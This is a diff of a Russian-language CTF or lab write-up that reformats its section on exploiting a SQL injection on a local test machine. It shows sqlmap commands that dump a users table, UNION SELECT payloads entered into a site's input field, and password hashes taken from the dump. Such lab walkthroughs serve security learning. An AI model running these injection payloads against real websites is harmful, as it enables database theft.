@@ -91,54 +91,61 @@
 - Целостность: так же, как может быть возможно прочитать конфиденциальную информацию, также возможно внести изменения или даже удалить эту информацию с помощью атаки SQL Injection.
 
 ## Как взломано ##
-- Метод 1. Можно склонить программу [sqlmap](git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev).
-Выведем на экран список баз данных, для этого перейдём в папку программы и запустим:
-```bash
-python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --tables
-```
-Выведем дамп таблицы users:
-```
-python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --dump -T users
-```
+- Метод 1. С помощью внешней программы sqlmap
+	- Склонить
+	```bash
+	(git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+	```
+	- Выведем на экран список баз данных, для этого перейдём в папку программы и запустим:
+	```bash
+	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --tables
+	```
+	- Выведем дамп таблицы users:
+	```
+	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --dump -T users
+	```
+	<img width="2010" alt="Screen Shot 2022-11-12 at 13 30 10" src="https://user-images.githubusercontent.com/84193980/201477756-53d0b759-bbe1-4e0e-9c3f-ffdefdb32913.png">
 
-	Decrypt this password -> then lower all the char. Sh256 on it and it's good ! 
-	key: 5ff9d0165b4f92b14994e5c685cdce28 
-	oter keys:
-	2b3366bcfd44f540e630d4dc2b9b06d9
-	60e9032c586fb422e2c16dee6286cf10 (oktoberfest)
-	e083b24a01c483437bcf4a9eea7c1b4d 
+		Decrypt this password -> then lower all the char. Sh256 on it and it's good ! 
+		key: 5ff9d0165b4f92b14994e5c685cdce28 
+		oter keys:
+		2b3366bcfd44f540e630d4dc2b9b06d9
+		60e9032c586fb422e2c16dee6286cf10 (oktoberfest)
+		e083b24a01c483437bcf4a9eea7c1b4d 
 
-- Метод 2. Через поле ввода.
+- Метод 2. Через поле ввода страницы сайта.
 
-Если оставить поле ввода пустым и нажать Enter, то мы получимЖ
-```
-You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
-```
+	- Если оставить поле ввода пустым и нажать Enter, то мы получим:
+	```
+	You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
+	```
 
-Значит, используется MariaDB
+	Значит, используется MariaDB
 
-Ввести в поле ввода:
+	Ввести в поле ввода:
 
-```
-1 UNION SELECT table_name, column_name FROM information_schema.columns
-```
+	```
+	1 UNION SELECT table_name, column_name FROM information_schema.columns
+	```
 
-Посмотрим на поля таблицы users: user_id, first_name, last_name, town, ountry, planet, Commentaire, countersign
+	Посмотрим на поля таблицы users: user_id, first_name, last_name, town, ountry, planet, Commentaire, countersign
 
-Что бы посмотреть все данные пользователей:
-```
-1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
-```
+	Что бы посмотреть все данные пользователей:
+	```
+	1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
+	```
+	<img width="922" alt="Screen Shot 2022-11-12 at 16 59 20" src="https://user-images.githubusercontent.com/84193980/201477846-0f12c5e8-c33f-41dc-a94e-1755141cab9d.png">
 
-или
+	или
 
-Запустить скрипт:
-```
-./get_page.sh
-192.168.56.3
- ```
+	Запустить скрипт:
+	```
+	./get_page.sh
+	192.168.56.3
+	 ```
+	<img width="1560" alt="Screen Shot 2022-11-12 at 16 24 55" src="https://user-images.githubusercontent.com/84193980/201477797-c91bba96-6d18-4aab-81f4-6d212cff7c24.png">
 
-Нас интересует пользователь в Surname которого указано "Decrypt this password"
+- Нас интересует пользователь в Surname которого указано "Decrypt this password"
 
 </details>
 
